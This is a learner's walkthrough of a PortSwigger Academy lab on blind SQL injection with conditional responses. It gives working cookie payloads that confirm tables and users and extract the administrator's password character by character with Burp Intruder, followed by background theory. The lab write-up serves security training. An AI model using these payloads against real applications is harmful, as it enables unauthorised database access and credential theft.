# Lab 06: Blind SQL injection with conditional responses

## Category
Blind SQL injection - conditional responses

## Objective
perform a SQL injection Blind attack to rtrive the administrator password.

## Solution

1. Let's strat by visiting the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie. For simplicity, let's say the original value of the cookie is
``
TrackingId=xyz
`` just as the suggested solution in portswigger academy siad.

2. Modify the `TrackingId` cookie, changing it to:

```sql
TrackingId=xyz' AND '1'='1
```

as we can see in the screenshot below the **Welcome back** message appears in the response.

![A true condition displays the Welcome back message](../assets/SQL%20Injection/Lab%2006%20-%20Blind%20Conditional%20Responses/step-01-true-condition-response.png)

3. Now change it to:

```sql
TrackingId=xyz' AND '1'='2
```

Now when the condition is wrong the **Welcome back** message does not appear in the response. This said that we can infer the result by test test the condition and retrive one piece of information each time.

![A false condition removes the Welcome back message](../assets/SQL%20Injection/Lab%2006%20-%20Blind%20Conditional%20Responses/step-02-false-condition-response.png)

4. Now let's change it to:

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```

The condition is true, means that there is a table called `users`.

![The query confirms that the users table exists](../assets/SQL%20Injection/Lab%2006%20-%20Blind%20Conditional%20Responses/step-03-users-table-exists.png)

5. Now let's change it to:

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

the condition is true, means that there is a user called `administrator`.

![The query confirms that the administrator account exists](../assets/SQL%20Injection/Lab%2006%20-%20Blind%20Conditional%20Responses/step-04-administrator-user-exists.png)

6. The next step is to determine how lengthe of the password of the administrator user. To do this, change the value to:

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

This condition of course true, saying that the password is greater than one character in length.

![Testing whether the administrator password is longer than one character](../assets/SQL%20Injection/Lab%2006%20-%20Blind%20Conditional%20Responses/step-05-password-length-condition.png)

7. Then using the intruder to conduct a sniper attack changing the number to add a payload sign as illustrated in the screenshot below:

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>§1§)='a
```

![Setting the Intruder payload position for the password length](../assets/SQL%20Injection/Lab%2006%20-%20Blind%20Conditional%20Responses/step-06-intruder-length-payload.png)

***Actually here I'd prefer to use the intruder in the sniper attack over the suggested soludtion in portswigger academy. Once the length has changed then this is the exact length of password***

(i.e. when the **Welcome back** message disappears), the length changes, then the length of the password is determined, which is in fact **20 characters long**.

![Intruder results help identify the password length](../assets/SQL%20Injection/Lab%2006%20-%20Blind%20Conditional%20Responses/step-07-password-length-results.png)

8. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder.

Send the request you are working on to Burp Intruder using the context menu.  
**NOTE: below is the suggested solution by portswigger academy. I also supported it with screenshots on how to conduct it, however I'd prefer to use the ***cluster Bomb Attack***. If you use the community edition you migt find it a little bit slower soe choose what you prefer.***

9. In Burp Intruder, change the value of the cookie to:

```sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

This uses the `SUBSTRING()` function to extract a single character from the password and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.

10. Place payload position markers around the final `a` character in the cookie value. To do this, select just the `a`, and click the **Add §** button.

You should then see the following as the cookie value:

```sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§'
```

![Adding a payload position around the character guess](../assets/SQL%20Injection/Lab%2006%20-%20Blind%20Conditional%20Responses/step-12-add-payload-position.png)

11. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined.

You can assume that the password contains only lowercase alphanumeric characters.

In the **Payloads** side panel:

- Check that **Simple list** is selected.
- Under **Payload configuration**, add payloads in the range:
  - `a-z`
  - `0-9`

You can select these easily using the **Add from list** drop-down.

  ![Configuring the character payload list](../assets/SQL%20Injection/Lab%2006%20-%20Blind%20Conditional%20Responses/step-09-character-payload-settings.png)

12. To be able to tell when the correct character was submitted, you'll need to grep each response for the expression:
``
Welcome back
``

To do this:

- Click on the **Settings** tab to open the Settings side panel.
- In the **Grep - Match** section, clear existing entries in the list.
- Add:
``
Welcome back
``

![Adding Welcome back as a Grep-Match value](../assets/SQL%20Injection/Lab%2006%20-%20Blind%20Conditional%20Responses/step-08-grep-match-settings.png)

13. Launch the attack by clicking the **Start attack** button.

14. Review the attack results to find the value of the character at the first position.

You should see a column in the results called ``Welcome back``.

![The first character attack results show the matching guess](../assets/SQL%20Injection/Lab%2006%20-%20Blind%20Conditional%20Responses/step-13-first-character-results.png)

15. Now, simply re-run the attack for each of the other character positions in the password to determine their value.

Go back to the Intruder tab and change the specified offset from `1` to `2`.

You should then see:

```sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
```

16. Launch the modified attack, review the results, and note the character at the second offset.

17. Continue this process testing offsets `3`, `4`, and so on, until you have the whole password.

18. In the browser, click **My account** to open the login page. Use the password to log in as the administrator user.

### More Advanced Techniques

Instead of iterating over every character, you could perform a binary search of the character space.

Or you could create a single Intruder attack with two payload positions and the **Cluster Bomb** attack type, and work through all permutations of offsets and character values.

>***Note 1:*** the burp suit commercial edition has some limitation in the intruder which makes it very slow in handling long lists especially in cluster bomp attack where the possibilities are very huge.

>***Note 2:*** a Cluster Bomb attack is used when you have multiple payload positions and want Burp to test all possible combinations of those payloads.

To conduct the attack
1. first change the attack type to the Cluster Bomb attck

2. Now add another payload position which is the target postion in the password

3. Ideally, the new payload should be a number from 1 to 20 which is the length of the password. we can change that from the payload configuration

![The position payload contains the password character offsets](../assets/SQL%20Injection/Lab%2006%20-%20Blind%20Conditional%20Responses/step-10-position-payload-values.png)

![The character payload contains possible password characters](../assets/SQL%20Injection/Lab%2006%20-%20Blind%20Conditional%20Responses/step-11-character-payload-values.png)

4. Now we run the attack where every value from Payload Set 1 is combined with every value from Payload Set 2.

5. sort the result according to its length and generate the password easially.

![Selecting Cluster Bomb to test every combination](../assets/SQL%20Injection/Lab%2006%20-%20Blind%20Conditional%20Responses/step-14-cluster-bomb-attack-type.png)

![Intruder is running the Cluster Bomb attack](../assets/SQL%20Injection/Lab%2006%20-%20Blind%20Conditional%20Responses/step-16-cluster-bomb-live-attack.png)

![The administrator account is logged in and the lab is solved](../assets/SQL%20Injection/Lab%2006%20-%20Blind%20Conditional%20Responses/step-17-administrator-login-success.png)

## A Bit of Theory

### What is Blind SQL Injection?

In a normal SQL injection, the application returns database data directly in the response.

For example:

```sql
SELECT Username FROM Users WHERE UserId='1'
```

If injectable, you might get:

```sql
' UNION SELECT Username FROM Users--
```

and see usernames on the page.

With **Blind SQL Injection**, the database is still executing your injected SQL, but the application does **not** display the query results.

So you need another way to determine whether your injected condition is **true** or **false**.

### Response-Based Blind SQLi

You visit a page and receive:

```http
Cookie: TrackingId=u5YD3PapBcR4lN3e
```

The application runs something similar to:

```sql
SELECT TrackingId
FROM TrackedUsers
WHERE TrackingId = 'u5YD3PapBcR4lN3e'
```

and shows:
``
Welcome back!
``

### Step 1: Test if the Parameter is Injectable

Modify the cookie:
``
' AND 1=1--
``

Result: ```Welcome back! ```

Because: ```TrackingId='' AND 1=1``` is true.

Now try: ```' AND 1=2-- ```

Result: ```(no Welcome back)```
Because: ```1=2 ``` is false.

This confirms:

1. The parameter is vulnerable.
2. The page behaves differently for true and false.

### What is a Conditional Response?

A conditional response means:

| Condition | Response |
|-----------|-----------|
| True | Welcome back |
| False | No Welcome back |

The response acts like a yes/no signal. You will never see database data. You only see whether the condition was true, then you will use that to retrive useful information.

### The Complete Process

1. Discover the injectable parameter.
2. Find true/false behavior.
3. Find the password length.
4. Find the password characters.
5. Reconstruct the password.
6. Log in as the administrator.


# What I Learned

- Discovered and confirmed a blind SQL injection vulnerability.
- Used boolean conditions to identify true and false responses.
- Verified the existence of database tables and users.
- Determined password length using the `LENGTH()` function.
- Enumerated password characters using the `SUBSTRING()` function.
- Automated testing using Burp Intruder.
- Practiced both Sniper and Cluster Bomb attack types.
- Extracted sensitive information using response-based behavior rather than direct database output.

---

# Tools

- Burp Suite
- Proxy
- Repeater
- Intruder
- Browser

---

# Result

✅ Confirmed the blind SQL injection vulnerability.

✅ Verified the existence of the `users` table and the `administrator` account.

✅ Determined that the administrator password consisted of 20 characters.

✅ Successfully extracted the password using conditional responses.

✅ Authenticated as the administrator user.

✅ Lab solved successfully.